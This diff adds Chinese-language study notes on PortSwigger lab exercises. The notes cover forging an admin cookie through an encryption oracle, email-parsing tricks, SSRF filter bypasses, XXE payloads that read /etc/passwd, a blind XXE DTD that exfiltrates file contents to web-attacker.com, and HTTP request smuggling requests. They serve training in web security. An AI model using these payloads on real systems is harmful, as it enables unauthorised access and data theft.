+csrf=oRFcBXMXzfDCKBgYKbko0GxepdqQuh56&postId=6&comment=something&name=common_title&email=administrator:1789885263983&website=http%3A%2F%2Fd.e
+```
+
+获取结果：
+
+```http
+HTTP/2 302 Found
+Location: /post?postId=6
+Set-Cookie: notification=AFfitMYDEfxvYVJSKNG%2fbOIuzH%2bGCIgiEbuDSMt6xQ6%2fnJ%2fZ7OxcK9dOi4mwTniT9GEBBE1mbFfaPSos%2fchJaQ%3d%3d; HttpOnly
+X-Frame-Options: SAMEORIGIN
+Content-Length: 0
+
+```
+
+携带返回的 cookie 访问文章页面有 `Invalid email address: administrator: 1789885263983 ` 这样的通知，需要想办法将前面 23 个字符去除： 
+
+```
+Invalid email address: 
+```
+
+使用 burpsuite 的 decoder 解码，先 url 解码再 base64解码后去除前 23 个16进制字符
+
+![image-20260920145018607](../upload/2026-07-06-PortSwigger_BurpSuite/image-20260920145018607.png)
+
+再将删除后字符串以 base64 加密：
+
+![image-20260920145138583](../upload/2026-07-06-PortSwigger_BurpSuite/image-20260920145138583.png)
+
+得到：K9dOi4mwTniT9GEBBE1mbFfaPSos/chJaQ== ，将此值作为cookie的 notification 值请求文章页面，出现报错，提示这个值必须是填充为 16 的倍数：
+
+```html
+<h4>Internal Server Error</h4>
+<p class=is-warning>Input length must be multiple of 16 when decrypting with padded cipher</p>
+```
+
+
+
+原先有23个字符再填充9个字符再次请求：
+
+```http
+POST /post/comment HTTP/2
+Host: 0ac70027049ea2f680a3c17a00de003e.web-security-academy.net
+Cookie: stay-logged-in=c3rSmy2rF9W6EJfNGUiK0fBovK8PSlMb4OYV0wyn2j0%3d; session=S3Avf9a3bLwAnN5azuskchUVq7qQyNsY
+... omit ...
+
+csrf=oRFcBXMXzfDCKBgYKbko0GxepdqQuh56&postId=6&comment=something&name=common_title&email=xxxxxxxxxadministrator:1789885263983&website=http%3A%2F%2Fd.e
+```
+
+响应：
+
+```http
+HTTP/2 302 Found
+Location: /post?postId=6
+Set-Cookie: notification=AFfitMYDEfxvYVJSKNG%2fbJT7KyI0%2bpuGBYTDG6sx8gd9KUO8KrTU%2f9d1nNa7WCBCPTNxpHb8gucK9fGm1vH3FQ%3d%3d; HttpOnly
+X-Frame-Options: SAMEORIGIN
+Content-Length: 0
+
+
+```
+
+将响应中字段再次拿到 decoder 中解码，这次去除前 32 位，之后再次 base64 加密，得到结果 `fSlDvCq01P/XdZzWu1ggQj0zcaR2/ILnCvXxptbx9xU=` 进行请求：
+
+```http
+GET /post?postId=6 HTTP/2
+Host: 0ac70027049ea2f680a3c17a00de003e.web-security-academy.net
+Cookie: notification=fSlDvCq01P/XdZzWu1ggQj0zcaR2/ILnCvXxptbx9xU=; stay-logged-in=c3rSmy2rF9W6EJfNGUiK0fBovK8PSlMb4OYV0wyn2j0%3d; session=S3Avf9a3bLwAnN5azuskchUVq7qQyNsY
+```
+
+页面通知内容变为：
+
+```html
+<header class="notification-header">
+            administrator:1789885263983                    
+</header>
+```
+
+说明解密程序能够正常识别并转换字符串，将加密字符串放到 `stay-logged-in` 字段，并删除 `session` 字段后请求 `/admin` URL，
+
+![image-20260920151836212](../upload/2026-07-06-PortSwigger_BurpSuite/image-20260920151836212.png)
+
+可以成功进入管理页面。
+
+
+
+#### 邮件地址解析差异
+
+参考：https://portswigger.net/research/splitting-the-email-atom
+
+![img](../upload/2026-07-06-PortSwigger_BurpSuite/3665-article-how-encoded-word-works.png)
+
+示例实验，必须使用 @ginandjuice.shop 后缀的内部邮箱才能注册，利用上面链接给出的方法：
+
+尝试 utf8 编码报错：
+
+```
+=?utf-8?q?=61=62=63?=wiener@ginandjuice.shop
+```
+
+尝试utf7可以正常注册：
+
+```
+=?utf-7?q?&AGEAYgBj-?=foo@ginandjuice.shop
+```
+
+下面开始尝试利用邮件地址解析差异，将邮件发送到 exploit-server 中邮箱：
+
+```
+Q编码和utf7字符集：
+=?utf-7?q?attacker&AEA-exploit-0a5f002003a244b780b9669a0130006f.exploit-server.net&ACA-?=@ginandjuice.shop
+
+或者使用 base64 编码 utf7字符集混合：
+=?utf-7?b?d2llbmVyJkFFQS1leHBsb2l0LTBhNWYwMDIwMDNhMjQ0Yjc4MGI5NjY5YTAxMzAwMDZmLmV4cGxvaXQtc2VydmVyLm5ldCZBQ0Et?=@ginandjuice.shop
+
+```
+
+可以正常收取到邮件。  
+
+
+
+### 预防
+
+
+
+* 确保开发人员、测试人员理解应用软件服务的领域
+* 避免对用户或其它关联的应用程序的行为做出隐式假设
+
+
+
+一些最佳实践：
+
+* 为所有的交互和工作流，维护清晰的设计文档和数据交互流程图，注意其中各个步骤中做的任何假设。
+* 尽可能写清晰易懂的代码。难以理解的代码，就难以注意到其中的逻辑漏洞。
+* 注意每个使用的组件所引用的其它代码。考虑以恶意的方式操作这些依赖关系，可能产生的结果。
+
+
+
+
+
+## Server-side request forgery(SSRF) 服务端请求伪造
+
+服务端请求伪造漏洞是指攻击者可以通过服务器连接到非预期位置发起请求。可能连接到服务器所在基础设施内网，获取敏感数据，甚至某些场景下可以执行任意命令。  
+
+通常是通过本地环回地址 127.0.0.1 、localhost 之类的地址发起请求。  
+
+
+
+### 常见攻击
+
+
+
+#### 针对服务器本身
+
+示例，一个购物程序向后端查询库存通过如下请求：
+
+```http
+POST /product/stock HTTP/1.0
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 118
+
+stockApi=http://stock.weliketoshop.net:8080/product/stock/check%3FproductId%3D6%26storeId%3D1
+```
+
+服务器通过向指定 URL 请求并将结果返回给客户端，假如存在一个管理页面 /admin 仅允许本地访问，攻击者修改请求将获取该页面内容：
+
+```http
+POST /product/stock HTTP/1.0
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 118
+
+stockApi=http://localhost/admin
+```
+
+
+
+应用程序允许或者隐式地信任本地请求，主要出于以下常见原因：
+
+* 访问控制位于应用程序前面地组件，应用程序设计、定位处于架构中可信任的位置
+* 灾备原因，允许本地机器无认证情况下访问管理
+* 管理系统与主应用程序使用不同端口，且未对外暴露
+
+出与以上及类似的原因，应用程序服务器信任来自本地的请求，就导致了 SSRF  
+
+
+
+#### 针对其它后端系统
+
+示例，内网管理系统为 http://192.168.0.68/admin ，允许来自局域网请求，攻击者就可以提交如下请求获取管理页面 ：
+
+```http
+POST /product/stock HTTP/1.0
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 118
+
+stockApi=http://192.168.0.68/admin
+```
+
+
+
+
+
+### 绕过常见防御
+
+有些常见预防 SSRF 的手段也可以被绕过。  
+
+#### 黑名单输入过滤
+
+一些应用使用黑名单阻止来自 `127.0.0.1` 、 `localhost` 之类的请求，或者敏感 URLs，下列方法可以进行尝试绕过：
+
+* 其它代表 `127.0.0.1` 的形式，例如：十进制 `2130706433`、八进制 `017700000001` 、简写形式 `127.1`
+* 注册自己的域名，配置解析为 `127.0.0.1` 
+* 混杂不同编码字符串编码尝试绕过黑名单
+* 尝试不同的协议，例如修改 http 为 https
+
+
+
+#### 白名单输入过滤
+
+一些应用使用白名单，只允许匹配白名单中值的输入。但过滤器采用的算法不同，就会产生差异。URL 规范中包含的一些特性在实现或验证时会被忽视：
+
+* 在主机名之前使用 `@` 符号嵌入凭证，例如  `https://expected-host:fakepassword@evil-host` 
+* 使用 `#` 字符，例如 `https://evil-host#expected-host`
+* 利用 DNS 解析，将匹配值以前缀形式放到解析中，例如 `https://expected-host.evil-host` 
+* 对部分或全部字符进行 URL 编码，混淆解析，如果实现过滤器的代码处理 URL 和执行 HTTP 请求的代码不同会尤其有用。多重编码，有些服务器会递归解码收到的 URL，会导致差异
+
+
+
+实验示例：  
+
+过滤器拦截了 127.0.0.1 ，仅允许来自 `stock.weliketoshop.net` 的请求，尝试使用 `@` 可以接收没有返回拦截信息：
+
+```http
+http://username@stock.weliketoshop.net/
+```
+
+继续尝试加入 `#` 字符，提示被拦截，使用 URL 编码 `%23` 也被拦截，：
+
+```http
+http://localhost:80#@stock.weliketoshop.net/
+```
+
+再使用双重编码修改为 `%2523` 可以通过过滤器，其中 `%25` 为  `%` 的编码，加入后缀 URL 通过实验：
+
+```http
+http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos
+```
+
+
+
+
+
+#### 重定向跳转
+
+一些应用中包含了重定向跳转，可能会被利用发起 SSRF，例如：`/product/nextProduct?currentProductId=6&path=http://evil-user.net` 跳转到 `http://evil-user.net`   
+
+下面请求虽然是来自信任主机，但重定向跳转可能被篡改以访问其它内网应用：
+
+```http
+POST /product/stock HTTP/1.0
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 118
+
+stockApi=http://weliketoshop.net/product/nextProduct?currentProductId=6&path=http://192.168.0.68/admin
+```
+
+  
+
+
+
+### 盲 SSRF
+
+当应用程序被诱导发起 SSRF，但 SSRF 的响应内容不会返回到客户端，就属于盲 SSRF。  
+
+盲 SSRF 通常的影响低于有响应的 SSRF，因为不能被利用检索数据，但有些情况下会被利用实现 RCE。  
+
+#### 发现
+
+发现和检查盲 SSRF 比较有效的方法是使用 OAST ，尝试对外发起连接请求。  
+
+在测试时有时会发现有对应 DNS 查询记录但没有后续请求，通常时因为应用程序尝试发起 HTTP 请求，主机发送了 DNS 查询，但后续 HTTP 被网络层过滤阻止了。很多时候基础设施层面允许 DNS 请求，但阻止 HTTP 请求。       
+
+#### 利用
+
+能够触发一个带外 HTTP 请求的盲 SSRF 通常没有太多可利用的路径，但有时可以被利用进行内网探测，批量发送已知漏洞的 Payload，如果这些 Payload 可以被利用也发起 OAST 带外请求，就会被进一步利用来确认内网中存在漏洞的服务器。  
+
+常见目标：
+
+| 目标                | 探测方式                   | 可能发现的漏洞            |
+| :------------------ | :------------------------- | :------------------------ |
+| **内部 Web 服务器** | 发送 HTTP 请求到常见端口   | 未授权访问、默认凭证      |
+| **Redis**           | 发送 `gopher://` Payload   | 未授权访问、写入 SSH 密钥 |
+| **Elasticsearch**   | 发送 HTTP 请求到 9200 端口 | 未授权访问、数据泄露      |
+| **Jenkins**         | 发送 HTTP 请求到 8080 端口 | 未授权访问、RCE           |
+| **云元数据**        | 请求 `169.254.169.254`     | 获取云服务器凭证          |
+
+
+
+### 寻找隐藏攻击面
+
+很多 SSRF 漏洞比较容易找到，因为应用程序正常请求的完整 URL、参数会被记录。有一些场景下会隐藏的比较深，较难定位。
+
+#### Partial URLs in request 请求中的部分URL
+
+有些应用将主机名或者 URL 路径的一部分放入请求参数，提交到后端服务。  
+
+
+
+#### URLs with data format 数据格式 中的 URL
+
+一些应用使用规定的格式传输数据。请求的 URL 包含在这些格式的数据文件中。常见的有 XML、JSON 等，此时就容易收到注入攻击，例如  XXE。 
+
+
+
+#### SSRF via Referer header
+
+一些应用出与跟踪、分析数据等原因会记录用户请求头中的 Referer 信息，如果分析软件会访问出现在该字段值的 URL，进一步记录站点内容等，就会被利用来 SSRF。  
+
+
+
+### Payload cheat sheet
+
+https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet
+
+
+
+
+
+## XML external entity(XXE) injection XML外部实体注入
+
+
+
+XXE 是一种攻击者可以干预到应用程序处理 XML 数据的漏洞。通常会导致攻击者查看应用服务器的文件系统、与应用服务器后端服务进行交互。一些场景下会扩大影响到后端底层服务器及其它基础设施，促使服务器发起 SSRF 攻击。  
+
+这种漏洞产生的原因是由于应用程序几乎总是通过标准库或者平台 API 处理服务器上的 XML 数据，XML 相关标准中包含了多种潜在危险的特性，虽然这些特性很多应用用不到，但标准 XML 解析器会实现这些特性。  
+
+XML 外部实体是一种自定义的 XML实体，其定义的值是从声明它们的 DTD 之外加载的，允许基于文件路径或者 URL 的内容定义一个实体。  
+
+
+
+### XML entities
+
+XML 全称是 "extensible markup language"，设计来存储或传输数据。如同 HTML，XML 使用标签和数据的树状结构，但不像HTML那样包含预定义标签，因此 tag 可以包含名称用来描述数据。早期 web 历史中很流行，但如今更多的应用使用 JSON 格式。  
+
+
+
+#### 内置实体
+
+XML 实体是一种在 XML 文档中表示数据项的方式，不是数据本身。XML 规范中定义了一些内建的实体，例如 实体 `&lt` 和 `&gt` 分别表示字符 `<` 和 `>`，这些是用于表示 XML 标签的元字符，当他们出现在数据中时，通常必须使用它们的实体来表示。  
+
+常见实体：
+
+| 实体     | 表示的字符 | 用途                     |
+| :------- | :--------- | :----------------------- |
+| `&lt;`   | `<`        | 小于号（标签开始）       |
+| `&gt;`   | `>`        | 大于号（标签结束）       |
+| `&amp;`  | `&`        | 与符号（实体引用的开始） |
+| `&quot;` | `"`        | 双引号（属性值边界）     |
+| `&apos`  | `'`        | 单引号（属性值边界）     |
+
+需要实体的原因：`<`、`>`、`&`、`"`、`'` 在 XML 中有特殊含义。当它们作为**数据**出现时，必须用实体表示，否则解析器会误以为它们是 XML 语法的一部分。
+
+```
+XML 文档：
+<user>Tom & Jerry</user>
+         ↑
+    解析器看到 & 会认为这是实体的开始，但 & Jerry 不是合法实体
+    → 解析错误
+
+正确写法：
+<user>Tom &amp; Jerry</user>
+         ↑
+    解析器看到 &amp; 会将其替换为 &
+    → 正确解析
+```
+
+
+
+XML 文档类型定义(Document Type Definition,DTD)包含了一个 XML 中可以定义的结构、包含的数据值类型、其它项目的声明。 DTD 在文档开头的可选 `DOCTYPE` 元素内部中声明。DTD 可以包含在文档本身之内，被称为内部 DTD，也可以从外部加载，被称为外部 DTD，也可以是两者的混合体。  
+
+
+
+
+
+#### 自定义实体
+
+XML 允许自定义实体，例如
+
+```xml
+<!DOCTYPE foo [ <!ENTITY myentity "my entity value" > ]>
+```
+
+上面定义的含义是：任何在此 xml 中引用 `&myentity;` 的地方会被替换为 `my entity value` 。
+
+
+
+#### 外部实体
+
+XML 外部实体是指定义在 xml 外部的自定义实体类型。使用 `SYSTEM` 关键字并指定一个 URL 来声明外部自定义实体。     
+
+示例：
+
+```xml
+<!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://normal-website.com" > ]>
+```
+
+也可以使用 `file://` 形式从文件中加载外部自定义实体：
+
+```xml
+<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///path/to/file" > ]>
+```
+
+
+
+
+
+
+
+### XXE 攻击类型
+
+* 利用 XXE 获取文件，当一个外部实体的定义中包含文件内容，并从应用响应返回。
+* 利用 XXE 执行 SSRF 攻击，当一个外部实体的定义基于 URL。
+* 盲 XXE 通过带外网络携带数据，将敏感数据传输到攻击者的系统上。
+* 盲 XXE 经过错误消息获取数据，攻击者可以触发一个解析错误消息，消息包含了敏感数据。
+
+
+
+### 利用 XXE 获取文件
+
+可以通过两种方式：
+
+* 引入或者编辑 `DOCTYPE` 元素，其中定义的外部实体包含了文件路径。
+* 编辑 XML 中定义的外部实体的值，返回给应用程序。
+
+
+
+示例，假设一个商城应用检查库存是通过提交如下 xml 内容给服务端：
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<stockCheck><productId>381</productId></stockCheck>
+```
+
+拦截并修改内容，加入新的 `DOCTYPE` 引用要获取的文件，并在后面进行引用，这里使用 `&xxe`：
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<stockCheck><productId>&xxe;</productId></stockCheck>
+```
+
+如果应用程序没有做任何防护，就会将文件内容包含在上下文中返回：
+
+```
+Invalid product ID: root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+...
+```
+
+
+
+
+
+### 利用 XXE 执行 SSRF 攻击
+
+如果应用程序中引用了 URL 的方式，就可以被利用来发起 SSRF。  
+
+示例：
+
+```xml
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
+```
+
+
+
+
+
+### 盲 XXE
+
+很多应用程序不会在 response 中包含定义的外部实体的值，这种场景下直接获取文件将行不通，但盲 XXE 还是能够被利用，有时需要结合一些带外技术或者导致触发解析错误的手段。
+
+  
+
+#### 使用 OAST 探测盲 XXE
+
+定义一个外部实体：
+
+```xml
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> ]>
+```
+
+这个 XXE 攻击会导致服务器发起一个 HTTP 请求到攻击者可以掌控的地址，通过监控 DNS 解析记录和 HTTP 请求记录，能够探测盲 XXE 是否成功。  
+
+
+
+有时 XXE 攻击使用的普通实体被输入验证或者 XML 解析器拦截，可以使用 XML 参数实体替代，`XML 参数实体` 是一种特殊类型的 XML 实体，只能被别处的 DTD 引用。  
+
+首先在参数实体名前使用 `%` 字符声明一个参数实体：
+
+```xml
+<!ENTITY % myparameterentity "my parameter entity value" >
+```
+
+然后使用 `%` 字符引用：
+
+```xml
+%myparameterentity;
+```
+
+参数实体类型定义测试使用 OAST 来探测盲 XXE：
+
+```xml
+<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>
+```
+
+
+
+
+
+#### 利用盲 XXE 经 OAST 携带数据
+
+ 上一节是检测盲 XXE 漏洞，攻击者真正想要利用该盲 XXE 漏洞外泄敏感数据，还需要一些步骤，要在攻击者控制的系统上放置一个恶意 DTD，然后从带内 XXE Payload 中调用该外部 DTD。  
+
+示例 DTD：
+
+```xml
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
+%eval;
+%exfiltrate;
+```
+
+上面 DTD 执行如下动作：
+
+* 定义一个参数实体 file，包含文件 /etc/passwd
+* 定义一个参数实体 eval，包含一个动态声明的参数实体 exfiltrate，exfiltrate 引用一个 URL，URL中包含了上一步定义的 file 内容
+* 使用 eval 实体，触发动态参数实体 exfiltrate 被执行
+* 使用 exfiltrate 实体，触发请求指定的 URL
+
+然后攻击者会放置恶意的 DTD 到他们控制的 web 主机上，例如：
+
+```xml
+http://web-attacker.com/malicious.dtd
+```
+
+最后攻击者提交 XXE Payload 到应用程序：
+
+```xml
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
+```
+
+这个 Payload 声明一个名为 xxe 的参数实体，然后在 DTD 中使用。这会导致 XML 解析并从攻击者提供的服务器获取外部 DTD 并内联解释，恶意 DTD 中定义的步骤随后被执行，文件内容被传输到攻击者服务器。  
+
+不过需要注意的是，在很多有换行的文件中可能无法利用，此时可以尝试 FTP 等协议替代 HTTP 或者更换尝试读取单行的文件。  
+
+
+
+DTD 中一些替代的字符编码
+
+| 原始字符 | 编码后   | 原因                                   |
+| :------- | :------- | :------------------------------------- |
+| `%`      | `&#x25;` | 在实体值中不能直接使用 `%`             |
+| `&`      | `&#x26;` | 在实体值中不能直接使用 `&`             |
+| `'`      | `&#x27;` | 在单引号包裹的实体值中不能直接使用 `'` |
+
+**为什么需要这些编码？**
+
+- 在 DTD 中，实体值本身是被引号包裹的字符串。
+- 如果字符串中需要包含 `%`、`&`、`'` 等特殊字符，必须使用 HTML 实体编码，否则会被解析器提前解释。
+
+
+
+
+
+
+
+
+
+#### 盲 XXE 经错误消息获取数据
+
+有些时候应用程序没有在 response 中返回文件数据，但 XML 解析错误消息中可能会包含文件数据，如果 response 中包含错误消息就可以被利用来获取数据。  
+
+示例，一个恶意 DTD：
+
+```xml
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
+%eval;
+%error;
+```
+
+行为如下：
+
+* 定义一个参数实体 file，包含 /etc/passwd 文件
+* 定义一个参数实体 eval，包含一个动态声明的外部参数实体 error，引用了不存在的路径和 file 实体的内容
+* 使用 eval，触发动态声明的 error 实体被触发
+* 使用 error 实体，触发文件不存在的错误解析消息中将包含 file 引用的 /etc/passwd 文件内容
+
+调用上面的恶意外部 DTD，可能会获取如下类似消息：
+
+```
+java.io.FileNotFoundException: /nonexistent/root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+...
+```
+
+
+
+
+
+#### 利用本地 DTD 
+
+很多时候无法调用外部 DTD，但如果知道目标服务器上存在一些已知的 DTD，这些 DTD 就可以被利用。  
+
+假设服务器有一个 DTD ：`/usr/local/app/schema.dtd` ，定义了一个实体 `custom_entity` ，攻击者就可以通过如下包含 /etc/passwd 文件的 Payload 触发错误消息：
+
+```xml
+<!DOCTYPE foo [
+<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
+<!ENTITY % custom_entity '
+<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
+<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
+&#x25;eval;
+&#x25;error;
+'>
+%local_dtd;
+]>
+```
+
+* 定义了一个参数实体 local_dtd，引用本地已存在的 DTD `/usr/local/app/schema.dtd` 
+* 重新定义了该 DTD 中已存在的 custom_entity 实体，触发了包含 /etc/passwd 内容上下文的错误消息
+* 使用 local_dtd 实体，外部 DTD 被解释，包含了重定义的 custom_entity 的值，这就导致产生错误消息
+
+
+
+**定位一个可利用的本地 DTD 文件**   
+
+这种 XXE 攻击的一个关键点就是利用文件系统上现有的 DTD，需要有一些方法探测和定位这些 DTD 文件。  
+
+例如使用 GNOME 桌面环境的通常存在： `/usr/share/yelp/dtd/docbookx.dtd` 这样一个 DTD 文件。  
+
+使用如下 XXE Payload 可以探测该文件是否存在：
+
+```xml
+<!DOCTYPE foo [
+<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
+%local_dtd;
+]>
+```
+
+如果文件缺失将导致一个错误，当定位一个确定存在的 DTD 以后，可以尝试从网上其它途径获取此路径文件下 DTD 定义的内容，很多 DTD 都是开源软件中定义和使用的。  
+
+
+
+### 找到隐藏攻击面
+
+如果应用程序正常在 HTTP 流量中包含 XML 数据，这种场景如果存在 XXE 将会比较明显。但有些场景不是像这样明显的交互。  
+
+#### XInclude 攻击
+
+有些场景下应用程序接收到客户端数据之后，在服务端才嵌入到一个 XML 文档中，然后进行解析。例如客户端提交的数据存放到一个后端 SOAP 请求中，由后端 SOAP 服务处理。  
+
+这种场景下前面的 XXE 攻击将不可用，因为无法控制整个 XML，也就无法定义或修改 `DOCTYPE` 元素。但可以使用 `XInclude` 元素代替，`XInclude` 元素是 XML 规范的一部分，允许从子文档构建 XML 文档，这样就可以将 XInclude 文档攻击放置在任何 XML 文档的任何数据中，因此可以在你提交的单个数据项情况下提交。  
+
+示例，需要先引入 XInclude 命名空间，并提供希望包含的文件路径：
+
+```xml
+<foo xmlns:xi="http://www.w3.org/2001/XInclude">
+<xi:include parse="text" href="file:///etc/passwd"/></foo>
+```
+
+
+
+#### 通过文件上传进行 XXE
+
+一些应用程序允许用户上传文件，然后在服务端处理。有一些常见的文件格式使用或包含了 XML 文档格式，例如 DOCX、SVG。  
+
+这样就可以利用来上传包含恶意 DTD 的文件，从而找到 XXE 攻击面。   
+
+
+
+#### 修改上下文类型
+
+大多数 POST 请求使用 HTML 表单生成的默认类型，例如 `application/x-www-form-urlencoded` ，有些网站会允许其它内容类型，例如 XML。  
+
+示例，一个 http 请求如下：
+
+```http
+POST /action HTTP/1.0
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 7
+
+foo=bar
+```
+
+修改成如下类型：
+
+```http
+POST /action HTTP/1.0
+Content-Type: text/xml
+Content-Length: 52
+
+<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
+```
+
+如果应用程序允许并解析消息体中的 xml 内容，就可以尝试找到 XXE 攻击面。  
+
+
+
+#### 快速发现和测试 XXE 漏洞
+
+大多数 XXE 可以使用 web 漏洞扫描器发现。  
+
+手工测试 XXE 漏洞，通常涉及：
+
+* 基于一个已知操作系统文件定义外部实体，并在应用程序中使用该实体，测试和检索文件
+* 通过监控你控制的 URL 外部实体相关 DNS、HTTP 请求，盲测 XXE 漏洞
+* 使用 XInclude 攻击尝试检索已知操作系统文件，测试用户提供的非 XML 格式数据在服务端 XML 文档处理存在的漏洞
+
+
+
+需要注意的是有时要使用 XML 转义编码 Payload，避免破坏 XML 语法。XML 只是一种数据传输格式，除了 XXE 还可以尝试 XSS 、SQL 注入等漏洞。  
+
+
+
+### 预防
+
+禁用那些用不到的 XML 危险特性，通常禁用外部实体解析和对 XInclude 的支持就足够，参考每种实现库和API的文档。
+
+
+
+
+
+## HTTP Request Smuggling (HTTP 请求走私)
+
+
+
+### 概念
+
+HTTP 请求走私是一种干涉web服务器处理正常用户发起的 HTTP 请求序列的技术，攻击者可能穿过安全机制，访问到未授权的敏感数据。  主要与 HTTP/1 有关。   
+
+目前存在很广泛的web服务架构，是前端服务器转发 HTTP 请求到后端服务器，出于性能和效率的考虑，很多前端服务器会通过一个连接发送多个请求，后端服务器通过协议标识区分不同的请求。  
+
+![image-20261009144147175](../upload/2026-07-06-PortSwigger_BurpSuite/image-20261009144147175.png)
+
+关键在于请求的分割界限，攻击者可能发送一个模糊的请求扰乱前后端原先各个 HTTP 请求的正常分割，这就可能导致严重的后果：
+
+![image-20261009144438007](../upload/2026-07-06-PortSwigger_BurpSuite/image-20261009144438007.png)
+
+
+
+
+
+
+
+大多数 HTTP 请求走私产生的原因是  HTTP/1 中提供了两种标记 request 结束的 header ：`Content-Length` 和 `Transfer-Encoding` 。  
+
+`Content-Length` 直接声明消息体的大小：
+
+```http
+POST /search HTTP/1.1
+Host: normal-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 11
+
+q=smuggling
+```
+
+`Transfer-Encoding` 头可以声明消息体使用 chunked encoding(分块编码)，这样消息体中就包含多个数据块，每个块以字节为单位表示大小，跟一个换行符，再跟块内容。消息以一个大小为0的块终止，例如：
+
+```http
+POST /search HTTP/1.1
+Host: normal-website.com
+Content-Type: application/x-www-form-urlencoded
+Transfer-Encoding: chunked
+
+b
+q=smuggling
+0
+```
+
+HTTP/1 中提供了两种不同的方法声明消息的长度，但一条消息中可能同时使用了两种方法，这样就产生了冲突。为了预防这个问题，两者同时存在时，`Content-Length` header 会被忽略。这样在单台服务器的情况下会避免歧义，但是在两台以上仍然可能存在该问题，主要原因有：
+
+* 一些服务器不支持 `Transfer-Encoding` header
+* 一些服务器虽然支持 `Transfer-Encoding`，但在含义不清的情况下不做处理
+
+前后端之间对  `Transfer-Encoding` header 的处理存在差异，分割符差异导致请求走私。  
+
+
+
+
+
+### 执行攻击
+
+经典的请求走私攻击会在单个 HTTP/1 的请求中包含 `Content-Length` 和 `Transfer-Encoding` 两种 header ，控制他们进而导致前后端处理请求的差异，具体的方式取决于前后端服务器的差异，下面 CL 、TE 分别代表两种 header：
+
+* CL.TE：前端使用 CL，后端使用TE
+* TE.CL：前端使用 TE，后端使用 CL
+* TE.TE：前端、后端都是用 TE
+
+
+
+#### CL.TE
+
+
+
+```http
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 13
+Transfer-Encoding: chunked
+
+0
+
+SMUGGLED
+```
+
+前端处理 `Content-Length: 13` 分割 13 个字节的长度，这样 SMUGGLED 就会被包含到一个请求发送到后端。后端处理采用 `Transfer-Encoding: chunked` 按照0字节的空行分割单个请求，SMUGGLED 就会被作为另一个单独请求处理。   
+
+
+
+#### TE.CL
+
+```http
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 3
+Transfer-Encoding: chunked
+
+8
+SMUGGLED
+0
+```
+
+
+
+
+
+
+
+#### TE.TE
+
+
+
+
+
+
+
+
+
+### 识别
+
+
+
+
+
+
+
+### 利用
+
+
+
+
+
+
+
+### 高级请求走私
+
+
+
+
+
+
+
+### 基于浏览器的请求走私
+
+
+
+
+
+### 预防
+
+
+
+
+
+
+
+## SSTI(Server-side Template Injection) 服务端模板注入
+
+
+
+
+
+
+
+## CORS
+
+
+
+
+
+## Clickjacking（UI redressing）
+
+
+
+
+
+## OS command injection
+
+
+
+
+
+## API Testing
+
+
+
+## JWT
+
+
+
+
+
+## NoSQL injection
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
